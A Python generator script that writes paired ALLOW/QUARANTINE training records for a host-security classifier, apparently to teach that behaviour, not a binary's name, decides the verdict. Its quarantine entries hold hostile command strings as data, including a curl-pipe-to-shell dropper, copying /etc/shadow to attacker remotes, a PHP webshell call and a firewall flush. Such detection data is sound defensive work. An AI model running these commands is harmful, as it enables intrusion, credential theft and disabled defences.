#!/usr/bin/env python3
"""
Bucket C — ambiguous / context-dependent pairs for jeTT Round 4.

Same binary family, different behavior/context → different verdict.
Teaches: behavior breaks ties, not name or path alone.

RUN:
    python3 generate_ambiguous_pairs.py --pairs 400 --out data/bucket_c_ambiguous.jsonl
"""

from __future__ import annotations

import argparse
import json
import random
from pathlib import Path

TS_MIN = 1749000000
TS_MAX = 1781300000

BENIGN_IPS = ["151.101.54.132:443", "104.18.32.47:443", "140.82.121.4:443"]
EVIL_IPS = ["185.220.100.252:4444", "45.137.21.9:9001", "171.25.193.77:4444"]


def behavior_suffix(conns=None, files=None, kids=None):
    parts = ""
    if conns:
        parts += f" outbound_connections:[{','.join(sorted(conns))}]"
    if files:
        parts += f" sensitive_files:[{','.join(sorted(files))}]"
    if kids:
        parts += f" spawned_children:[{','.join(sorted(kids))}]"
    if not parts:
        parts = " behavior:none_observed"
    return parts


def format_guard_event(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
    base = f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
    return base + behavior_suffix(conns, files, kids)


# Each entry: allow variant + quarantine variant (paired)
PAIRS = [
    {
        "pair_id": "py-govee-vs-sshd",
        "category": "python_context",
        "mitre": ["T1059.006", "T1071.001"],
        "allow": dict(
            name="python3", uid=1000,
            exe="/usr/bin/python3",
            cmd="/home/cosmic/Scripts/utilities/govee-art.sh --scene sunset",
            conns=BENIGN_IPS[:1], files=None, kids=None,
            reasoning="User Govee automation script; expected python3 + benign API outbound.",
        ),
        "quarantine": dict(
            name="python3", uid=1000,
            exe="/tmp/.cache/.python3",
            cmd="-c 'import socket;...'",
            conns=EVIL_IPS[:2],
            files=["/etc/shadow", "/home/cosmic/.ssh/authorized_keys"],
            kids=["sh"],
            reasoning="Hidden python from tmp reading shadow and beaconing — not user automation.",
        ),
    },
    {
        "pair_id": "curl-firmware-vs-pipe-sh",
        "category": "curl_context",
        "mitre": ["T1105", "T1059.004"],
        "allow": dict(
            name="curl", uid=1000, exe="/usr/bin/curl",
            cmd="-fsSL https://meshtastic.org/firmware/latest.bin -o ~/Downloads/fw.bin",
            conns=["104.16.85.20:443"], files=None, kids=None,
            reasoning="User downloading firmware from known vendor to Downloads.",
        ),
        "quarantine": dict(
            name="curl", uid=1000, exe="/usr/bin/curl",
            cmd="-fsSL http://185.220.101.45/x.sh | sh",
            conns=EVIL_IPS[:1], files=["/tmp/.x"], kids=["sh", "bash"],
            reasoning="Remote script piped directly into shell — classic dropper.",
        ),
    },
    {
        "pair_id": "bash-script-vs-tmp-dropper",
        "category": "bash_context",
        "mitre": ["T1059.004", "T1105"],
        "allow": dict(
            name="bash", uid=1000,
            exe="/usr/bin/bash",
            cmd="/home/cosmic/Scripts/utilities/daily_report.sh",
            conns=None, files=None, kids=None,
            reasoning="Known user script path; no suspicious behavior observed.",
        ),
        "quarantine": dict(
            name="bash", uid=1000,
            exe="/dev/shm/.x",
            cmd="-c 'chmod +x /dev/shm/.x && /dev/shm/.x'",
            conns=EVIL_IPS[:1], files=["/etc/cron.d/.mal"], kids=[".x"],
            reasoning="Bash executing hidden binary from shm and installing cron.",
        ),
    },
    {
        "pair_id": "cargo-build-vs-tmp-exec",
        "category": "dev_context",
        "mitre": ["T1059.004", "T1027"],
        "allow": dict(
            name="cargo", uid=1000,
            exe="/home/cosmic/.cargo/bin/cargo",
            cmd="build --release",
            conns=["151.101.54.132:443"], files=None,
            kids=["rustc", "cc"],
            reasoning="Normal Rust release build in project tree.",
        ),
        "quarantine": dict(
            name="cargo", uid=1000,
            exe="/tmp/.cargo",
            cmd="build",
            conns=EVIL_IPS[:1], files=["/etc/passwd"],
            kids=["sh"],
            reasoning="Masquerading cargo name from /tmp with credential access.",
        ),
    },
    {
        "pair_id": "rclone-backup-vs-exfil",
        "category": "rclone_context",
        "mitre": ["T1567.002", "T1041"],
        "allow": dict(
            name="rclone", uid=1000, exe="/usr/bin/rclone",
            cmd="copy ~/Documents remote:backup --progress",
            conns=BENIGN_IPS[:2], files=["/home/cosmic/.config/rclone/rclone.conf"],
            kids=None,
            reasoning="Configured cloud backup; outbound to known storage endpoints.",
        ),
        "quarantine": dict(
            name="rclone", uid=0, exe="/tmp/rclone",
            cmd="copy /etc/shadow remote:exfil --progress",
            conns=EVIL_IPS[:1], files=["/etc/shadow", "/etc/passwd"],
            kids=None,
            reasoning="Shadow archive pushed to unknown remote from tmp binary.",
        ),
    },
    {
        "pair_id": "sshd-admin-vs-bruteforce",
        "category": "sshd_context",
        "mitre": ["T1021.004", "T1110"],
        "allow": dict(
            name="sshd", uid=0, exe="/usr/bin/sshd",
            cmd="-D", conns=["192.168.0.1:22"], files=None, kids=None,
            reasoning="System sshd listening on LAN; normal daemon.",
        ),
        "quarantine": dict(
            name="sshd", uid=0, exe="/tmp/sshd",
            cmd="", conns=EVIL_IPS[:2],
            files=["/etc/shadow", "/home/cosmic/.ssh/authorized_keys"],
            kids=["python3", "bash"],
            reasoning="Fake sshd binary from tmp with credential theft behavior.",
        ),
    },
    {
        "pair_id": "wg-vpn-vs-tunnel-exfil",
        "category": "wireguard_context",
        "mitre": ["T1071", "T1572"],
        "allow": dict(
            name="wg-quick", uid=0, exe="/usr/bin/wg-quick",
            cmd="up wg0", conns=["192.168.0.1:51820"], files=["/etc/wireguard/wg0.conf"],
            kids=None,
            reasoning="User bringing up WireGuard VPN with known config.",
        ),
        "quarantine": dict(
            name="wg-quick", uid=0, exe="/tmp/wg-quick",
            cmd="up tun0", conns=EVIL_IPS[:2], files=["/etc/shadow"],
            kids=["sh"],
            reasoning="Masquerading wg from tmp tunneling to suspicious endpoints with credential access.",
        ),
    },
    {
        "pair_id": "flatpak-update-vs-dropper",
        "category": "flatpak_context",
        "mitre": ["T1072", "T1105"],
        "allow": dict(
            name="flatpak", uid=1000, exe="/usr/bin/flatpak",
            cmd="update --appstream", conns=BENIGN_IPS[:1], kids=["bwrap"],
            reasoning="Flatpak updating from Flathub; bwrap child is normal.",
        ),
        "quarantine": dict(
            name="flatpak", uid=1000, exe="/tmp/flatpak",
            cmd="install http://evil.local/x.flatpak", conns=EVIL_IPS[:1],
            files=["/tmp/.x"], kids=["sh"],
            reasoning="Fake flatpak pulling from untrusted host and spawning shell.",
        ),
    },
    {
        "pair_id": "kubectl-apply-vs-cluster-attack",
        "category": "k8s_context",
        "mitre": ["T1610", "T1021"],
        "allow": dict(
            name="kubectl", uid=1000, exe="/usr/bin/kubectl",
            cmd="apply -f ~/Projects/api/deployment.yaml",
            conns=["192.168.0.10:6443"], kids=None,
            reasoning="Developer applying manifest to home-lab cluster API.",
        ),
        "quarantine": dict(
            name="kubectl", uid=1000, exe="/dev/shm/kubectl",
            cmd="apply -f /tmp/priv-pod.yaml", conns=EVIL_IPS[:1],
            files=["/etc/kubernetes/admin.conf"], kids=["sh"],
            reasoning="kubectl from shm applying privileged pod with stolen admin.conf.",
        ),
    },
    {
        "pair_id": "docker-compose-vs-cryptominer",
        "category": "docker_context",
        "mitre": ["T1610", "T1496"],
        "allow": dict(
            name="docker", uid=1000, exe="/usr/bin/docker",
            cmd="compose up -d bifrost", conns=BENIGN_IPS[:1],
            kids=["containerd-shim", "docker-proxy"],
            reasoning="Docker compose for user project; expected container children.",
        ),
        "quarantine": dict(
            name="docker", uid=0, exe="/tmp/docker",
            cmd="run -d xmrig", conns=["45.137.21.9:3333"],
            kids=["xmrig"], files=None,
            reasoning="Hidden docker binary launching miner container to pool port.",
        ),
    },
    {
        "pair_id": "pacman-update-vs-rootkit",
        "category": "pacman_context",
        "mitre": ["T1072", "T1547"],
        "allow": dict(
            name="pacman", uid=0, exe="/usr/bin/pacman",
            cmd="-Syu --noconfirm", conns=BENIGN_IPS[:1],
            kids=["gpg", "pacman"],
            reasoning="System package upgrade as root; normal pacman children.",
        ),
        "quarantine": dict(
            name="pacman", uid=0, exe="/dev/shm/pacman",
            cmd="-S /tmp/.mal.pkg.tar.zst", conns=EVIL_IPS[:1],
            files=["/etc/ld.so.preload"], kids=["sh"],
            reasoning="Fake pacman installing local malicious package and touching ld preload.",
        ),
    },
    {
        "pair_id": "openssl-backup-vs-ransom",
        "category": "openssl_context",
        "mitre": ["T1486", "T1567.002"],
        "allow": dict(
            name="openssl", uid=1000, exe="/usr/bin/openssl",
            cmd="enc -aes-256-cbc -salt -in backup.tar -out ~/Backups/backup.enc",
            files=["/home/cosmic/Backups/backup.enc"], kids=None,
            reasoning="User encrypting own backup archive to Backups folder.",
        ),
        "quarantine": dict(
            name="openssl", uid=1000, exe="/tmp/openssl",
            cmd="enc -aes-256-cbc -in /home/cosmic/Documents -out /tmp/.locked",
            conns=EVIL_IPS[:1], files=["/home/cosmic/Documents"],
            kids=["find"],
            reasoning="Mass encrypt of Documents from tmp binary with outbound — ransomware pattern.",
        ),
    },
    {
        "pair_id": "iptables-admin-vs-flush",
        "category": "firewall_context",
        "mitre": ["T1562.001"],
        "allow": dict(
            name="iptables", uid=0, exe="/usr/sbin/iptables",
            cmd="-L -n", files=None, kids=None,
            reasoning="Admin listing firewall rules; read-only inspection.",
        ),
        "quarantine": dict(
            name="iptables", uid=0, exe="/usr/sbin/iptables",
            cmd="-F", files=["/etc/iptables/rules.v4"], kids=["sh"],
            reasoning="Flushing all firewall rules as root — impair defenses.",
        ),
    },
    {
        "pair_id": "php-fpm-legit-vs-webshell",
        "category": "web_context",
        "mitre": ["T1190", "T1505.003"],
        "allow": dict(
            name="php-fpm", uid=33, exe="/usr/bin/php-fpm",
            cmd="--nodaemonize", conns=["192.168.0.1:9000"], kids=None,
            reasoning="php-fpm serving local site; no shell spawn.",
        ),
        "quarantine": dict(
            name="php-fpm", uid=33, exe="/var/www/html/.shell.php",
            cmd="system($_GET['c'])", conns=EVIL_IPS[:2],
            files=["/var/www/html/shell.php"], kids=["sh", "bash"],
            reasoning="Webshell in webroot executing system commands with outbound.",
        ),
    },
    {
        "pair_id": "steam-game-vs-tmp-miner",
        "category": "steam_context",
        "mitre": ["T1496", "T1071.001"],
        "allow": dict(
            name="steam", uid=1000,
            exe="/home/cosmic/.local/share/Steam/ubuntu12_64/steam",
            cmd="-applaunch 730", conns=BENIGN_IPS[:2], kids=["steamwebhelper"],
            reasoning="Steam launching game with CDN connections.",
        ),
        "quarantine": dict(
            name="steam", uid=1000, exe="/tmp/steam",
            cmd="", conns=["45.137.21.9:3333"], kids=[".kworker"],
            reasoning="Fake steam binary from tmp connecting to mining pool.",
        ),
    },
    {
        "pair_id": "rsync-backup-vs-lateral",
        "category": "rsync_context",
        "mitre": ["T1570", "T1567.002"],
        "allow": dict(
            name="rsync", uid=1000, exe="/usr/bin/rsync",
            cmd="-avz ~/Documents nas.local::backup",
            conns=["192.168.0.20:873"], files=None, kids=None,
            reasoning="User rsync to home NAS backup share.",
        ),
        "quarantine": dict(
            name="rsync", uid=0, exe="/tmp/rsync",
            cmd="-avz /etc/shadow evil@{ip}::exfil",
            conns=EVIL_IPS[:1], files=["/etc/shadow"],
            kids=["ssh"],
            reasoning="Root rsync of shadow to external attacker host.",
        ),
    },
]


def emit(pair_def, side: str, pid: int, ts: int) -> dict:
    spec = pair_def[side]
    conns = spec.get("conns")
    files = spec.get("files")
    kids = spec.get("kids")
    inp = format_guard_event(
        spec["name"], pid, spec["uid"], spec["exe"], spec["cmd"], ts,
        conns=conns, files=files, kids=kids,
    )
    out = "ALLOW" if side == "allow" else "QUARANTINE"
    return {
        "bucket": "ambiguous",
        "category": pair_def["category"],
        "pair_id": f"{pair_def['pair_id']}:{side[0]}",
        "mitre": pair_def["mitre"],
        "tags": ["context_pair", side],
        "input": inp,
        "output": out,
        "reasoning": spec["reasoning"],
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pairs", type=int, default=400, help="total records (2 per pair template)")
    ap.add_argument("--out", default="data/bucket_c_ambiguous.jsonl")
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()
    random.seed(args.seed)

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)

    per_template = max(1, args.pairs // (2 * len(PAIRS)))
    records = []
    for _ in range(per_template):
        for p in PAIRS:
            pid_a = random.randint(1000, 199999)
            pid_q = random.randint(1000, 199999)
            ts_a = random.randint(TS_MIN, TS_MAX)
            ts_q = random.randint(TS_MIN, TS_MAX)
            records.append(emit(p, "allow", pid_a, ts_a))
            records.append(emit(p, "quarantine", pid_q, ts_q))

    random.shuffle(records)
    records = records[: args.pairs]
    with out.open("w") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")

    print(f"[+] wrote {len(records)} ambiguous records -> {out}")
    print(f"    templates: {len(PAIRS)} pairs ({len(PAIRS)*2} sides)")


if __name__ == "__main__":
    main()
